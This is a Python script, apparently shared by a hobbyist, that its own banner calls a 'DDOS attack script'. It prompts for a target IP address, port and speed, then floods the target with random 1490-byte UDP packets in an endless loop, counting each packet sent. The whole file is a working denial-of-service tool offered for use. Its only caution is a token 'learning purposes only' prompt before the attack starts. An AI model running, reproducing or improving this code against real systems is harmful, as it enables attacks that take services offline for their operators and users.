import socket
import time
import random
import threading
import sys
import os
#code time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#attact
print("If there is a problem with the display, adjust the terminal to full-screen mode and then reopen the script")
print(" _____________________________________________________________________________________ ")
print("╱                                                                                     ╲")
print('''|     _ \        __ \  __ \               ___|           _)       |                    |
|    |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|                  |
|    ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |                    |
|   _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|                  |        
|          ____/                                            _|                         |          ''')
print("|======================================================================================|")
print("| PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON |")
print("|======================================================================================|")
print("│                        author:周XY Zhouxuanyao233                                    |")
print("│          My github:Zhouxuanyao2333(https://github.com/Zhouxuanyao2333)               │")
print("|严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者 |")
print("|                    原理很简单准确的说这个应该是DOS脚本awa                            |")
print("|             My E-mail Zhouxuanyao233@outlook.com wpsoffice88@qq.com                  |")
print("╲_____________________________________________________________________________________╱")
IP_address = input("Please enter the IP address of the server you want to attack:")
TPS = int(input("Please enter the port of the server you want to attack:"))
speed = int(input("Please enter the Attack speed(1-1000):"))
huida = input("Warning: This script is for learning purposes only, don't break the law! Do you want to start an attack? (Y/N)")
if huida == "Y":
    print("OK is Attacking")
    os.system("clear")
    #变量设置
    sent = 0
    while True:
        sock.sendto(bytes, (IP_address,TPS))
        sent = sent + 1
        print ("The server has been attacked  %s time for %s port %d"%(sent,IP_address,TPS))
        time.sleep((1000-speed)/2000)
elif huida == "N":
    os.system("clear")
    print("Turn off the attack!")
else:
    print("WTF")